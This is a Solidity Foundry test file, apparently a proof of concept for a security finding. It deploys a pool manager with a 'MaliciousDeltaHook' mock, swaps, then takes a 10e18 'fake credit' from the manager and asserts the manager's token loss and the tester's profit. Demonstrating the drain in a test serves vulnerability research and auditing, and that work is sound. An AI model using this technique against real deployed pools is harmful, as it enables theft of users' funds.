// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "../src/types/BalanceDelta.sol";

contract Token {
    mapping(address=>uint) public balanceOf;
    function mint(address t,uint a) external {balanceOf[t]+=a;}
    function transfer(address t,uint a) external returns(bool){balanceOf[msg.sender]-=a; balanceOf[t]+=a; return true;}
    function transferFrom(address f,address t,uint a) external returns(bool){balanceOf[f]-=a; balanceOf[t]+=a; return true;}
    function approve(address,uint) external pure returns(bool){return true;}
}

contract POC is Test {
    using BalanceDeltaLibrary for BalanceDelta;
    PoolManager public manager;
    MaliciousDeltaHook public hook;
    Token public token0; Token public token1;
    PoolKey public key;

    function setUp() public {
        Token t0=new Token(); Token t1=new Token();
        if(address(t0)>address(t1)){Token tmp=t0; t0=t1; t1=tmp;}
        token0=t0; token1=t1;
        manager=new PoolManager(address(this));
        uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
        vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
        hook=MaliciousDeltaHook(a);
        token0.mint(address(this),1000e18); token1.mint(address(this),1000e18);
        token0.mint(address(manager),1000e18); token1.mint(address(manager),1000e18);
        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
        hook.setCurrency1(Currency.wrap(address(token1)));
        hook.setAttacker(address(this));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
        manager.unlock(abi.encode(uint256(1)));
    }

    function unlockCallback(bytes calldata data) external returns(bytes memory){
        Currency c0 = Currency.wrap(address(token0));
        Currency c1 = Currency.wrap(address(token1));
        uint256 action = abi.decode(data,(uint256));
        if(action==1){
            (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
            int128 amt0 = delta.amount0();
            int128 amt1 = delta.amount1();
            if (amt0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-amt0)); manager.settle(); }
            if (amt1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-amt1)); manager.settle(); }
            if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
            if (amt1 > 0) manager.take(c1, address(this), uint128(amt1));
        } else {
            console.log("DOING SWAP NOW");
            BalanceDelta sDelta = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
            int128 s0 = sDelta.amount0();
            int128 s1 = sDelta.amount1();
            console.log("SWAP s0"); console.logInt(s0);
            console.log("SWAP s1"); console.logInt(s1);
            if (s0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-s0)); manager.settle(); }
            if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
            if (s0 > 0) manager.take(c0, address(this), uint128(s0));
            if (s1 > 0) manager.take(c1, address(this), uint128(s1));
            // FIX FOR CurrencyNotSettled: take the hook's 10e18 fake credit
            console.log("Taking hook credit 10e18");
            manager.take(c0, address(this), 10e18);
        }
        return "";
    }

    function test_afterSwapReturnDelta() public {
        uint bBefore = token0.balanceOf(address(manager));
        uint myBefore = token0.balanceOf(address(this));
        manager.unlock(abi.encode(uint256(2)));
        uint bAfter = token0.balanceOf(address(manager));
        uint myAfter = token0.balanceOf(address(this));
        console.log("MANAGER BEFORE:", bBefore);
        console.log("MANAGER AFTER:", bAfter);
        console.log("MANAGER LOSS:", bBefore - bAfter);
        console.log("MY PROFIT:", myAfter - myBefore);
        assertLt(bAfter, bBefore);
    }
}